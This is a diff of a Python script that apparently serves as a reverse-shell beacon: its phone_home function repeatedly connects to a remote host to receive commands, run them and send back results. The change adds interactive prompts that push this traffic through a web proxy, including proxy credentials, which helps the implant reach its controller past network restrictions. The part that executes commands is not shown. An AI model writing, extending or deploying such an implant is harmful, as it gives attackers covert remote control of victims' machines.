@@ -1,11 +1,13 @@
 #!python3
 
+
 # Standard libraries only
 import sys
 import socket
 import subprocess
 import time
 import pickle
+import os
 
 
  # Display script usage if not given correct number of arguments.
@@ -21,6 +23,7 @@ rserver = (rhost, int(rport))
 
 
 def phone_home():
+# Core function, Call, get, run, send.
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect(rserver)
@@ -60,7 +63,36 @@ def phone_home():
     s = None
     return
 
-# Run the function forever.
+
 while True:
+# Ask for proxy information, and configure if needed.
+    prox_ask = input("Would you like to push traffic through a web proxy (y/n)?: ")
+    if prox_ask.lower() in ['y', 'yes']:
+        prox_prot = input("What is the protocol (http/https)?: ")
+        prox_user = input("What is the username?, if none hit enter: ")
+        prox_pass = input("What is the password?, if none hit enter: ")
+        prox_url = input("What is the proxy address/URL?: ")
+        prox_port = input("What is the proxy port?: ")
+        proxy = prox_prot+'//'+prox_user+':'+prox_pass+'@'+prox_url+':'+prox_port
+        print("\n", proxy)
+        prox_conf = input("Does the above look correct (y/n)?: ")
+        if prox_conf.lower() in ['y', 'yes']:
+            os.environ['http_proxy'] = proxy 
+            os.environ['HTTP_PROXY'] = proxy
+            os.environ['https_proxy'] = proxy
+            os.environ['HTTPS_PROXY'] = proxy
+            print('Proxy environment set')
+            break
+        else:
+            print("Let's try again.")
+    elif prox_ask.lower() in ['n', 'no']:
+        print('skipping proxy set up')
+        break
+    else:
+        print("Try again...")
+
+
+while True:
+# Run the function forever.
     phone_home()
     time.sleep(wait)
